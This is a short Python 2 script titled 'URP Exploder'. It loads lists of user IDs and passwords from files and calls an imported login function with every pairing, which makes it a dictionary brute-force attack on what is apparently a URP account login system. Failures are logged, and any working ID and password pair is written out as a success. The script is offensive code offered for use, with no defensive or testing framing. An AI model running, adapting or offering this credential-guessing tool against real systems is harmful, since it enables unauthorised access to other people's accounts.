''' URP Exploder'''
import requests
import lxml
import sys
sys.path.append("..")
import URP_login as login

def guessPW(ID, guessPW):
	
	pass

if __name__ == '__main__':
	folder = 'URP_exploder/'
	fileOfID = open(folder+'IDlist.txt','r')
	IDlist = []
	for i in fileOfID:
		IDlist.append(i.strip())
	fileOfID.close()

	fileOfPW = open(folder+'PWlist.txt','r')
	PWlist = []
	for x in fileOfPW:
		print x
		PWlist.append(x.strip())
	fileOfPW.close()
	
	print PWlist
	
	logFile = open(folder+'log.txt', 'w+')
	logFile.write('init\n')

	for id in IDlist :
		logFile.write('start explode for id='+ id +'\n')		
		for pw in PWlist :
			try :
				rtn = login.Login(id, pw)
			except :
				logFile.write('for id= ' + id + ' pw= '+ pw + ' is Exception\n')
				rtn = False
			finally:	
				if rtn is False :
					logFile.write('for id= ' + id + ' pw= '+ pw + ' is failed\n')
				else :
					logFile.write('FOR ID= ' + id + ' PW= '+ pw + ' IS SUCCESSED\n')
					break
